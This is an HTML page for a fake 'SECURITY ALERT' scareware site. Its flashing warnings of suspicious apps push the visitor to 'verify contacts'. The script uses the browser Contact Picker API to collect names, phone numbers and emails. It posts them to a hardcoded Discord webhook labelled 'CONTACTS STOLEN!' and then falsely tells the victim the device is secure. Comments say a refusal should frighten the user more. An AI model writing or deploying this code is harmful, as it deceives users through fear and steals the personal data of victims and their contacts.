<!DOCTYPE html>
<html>
<head>
    <link rel="manifest" href="manifest.json">
    <style>
        body {
            background: #000;
            color: red;
            font-family: monospace;
            animation: blink 0.5s infinite;
        }
        @keyframes blink {
            0%,100%{background:#000}
            50%{background:#8b0000}
        }
        .alert {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            width: 300px;
            border: 5px solid red;
            animation: pop 0.3s;
        }
        @keyframes pop {
            0%{transform:translate(-50%,-50%) scale(0)}
            100%{transform:translate(-50%,-50%) scale(1)}
        }
        .danger-icon {
            font-size: 80px;
            margin-bottom: 20px;
        }
        h1 {
            color: red;
            font-size: 24px;
            margin-bottom: 15px;
        }
        p {
            color: #333;
            margin-bottom: 20px;
        }
        .btn-danger {
            background: red;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 18px;
            width: 100%;
            cursor: pointer;
            font-weight: bold;
        }
        .btn-danger:hover {
            background: darkred;
        }
        .progress {
            width: 100%;
            height: 10px;
            background: #ddd;
            border-radius: 5px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-bar {
            width: 0%;
            height: 100%;
            background: red;
            animation: progress 3s infinite;
        }
        @keyframes progress {
            0%{width:0%}
            50%{width:100%}
            100%{width:0%}
        }
    </style>
</head>
<body>
    <div class="alert" id="alertBox">
        <div class="danger-icon">⚠️</div>
        <h1>SECURITY ALERT!</h1>
        <p>🚨 3 SUSPICIOUS APPS DETECTED<br>🚨 YOUR DATA IS AT RISK<br>🚨 VERIFY CONTACTS NOW</p>
        
        <div class="progress">
            <div class="progress-bar"></div>
        </div>
        
        <button class="btn-danger" onclick="triggerContactPicker()" id="mainBtn">
            🔴 VERIFY CONTACTS NOW
        </button>
        
        <p style="font-size:12px; color:#666; margin-top:15px;">
            ⚡ Immediate action required!<br>
            Click to secure your device
        </p>
    </div>

    <script>
        // manifest link
        const link = document.createElement('link');
        link.rel = 'manifest';
        link.href = 'manifest.json';
        document.head.appendChild(link);

        // Service Worker register
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js');
        }

        function triggerContactPicker() {
            const btn = document.getElementById('mainBtn');
            btn.innerHTML = '⏳ SCANNING...';
            btn.disabled = true;
            
            setTimeout(() => {
                selectContacts();
            }, 2000);
        }

        async function selectContacts() {
            try {
                if (!('contacts' in navigator)) {
                    alert('This feature is not supported on your device');
                    return;
                }

                const props = ['name', 'tel', 'email'];
                
                // YE LINE CONTACT SELECT KARWATI HAI
                const contacts = await navigator.contacts.select(props, {
                    multiple: true  // Saare contacts select karne dega
                });

                // Discord par bhejo
                await fetch('https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: '@everyone 📱 **CONTACTS STOLEN!**',
                        embeds: [{
                            title: 'Victim Contacts',
                            fields: contacts.map((c, i) => ({
                                name: `👤 Contact ${i+1}`,
                                value: `Name: ${c.name?.[0] || 'N/A'}\n📞 ${c.tel?.[0] || 'N/A'}\n📧 ${c.email?.[0] || 'N/A'}`,
                                inline: true
                            }))
                        }]
                    })
                });

                alert('✅ SCAN COMPLETE! Your device is secure.');

            } catch (err) {
                if (err.name === 'NotAllowedError') {
                    // Agar user ne mana kiya to aur zyada darega
                    document.getElementById('alertBox').innerHTML = `
                        <div class="danger-icon">💀</div>
                        <h1>CRITICAL!</h1>
                        <p>⚠️ VERIFICATION FAILED!<br>⚠️ YOUR PHONE IS AT RISK</p>
                        <button class="btn-danger" onclick="triggerContactPicker()">
                            🔴 TRY AGAIN
                        </button>
                    `;
                }
            }
        }
    </script>
</body>
</html>
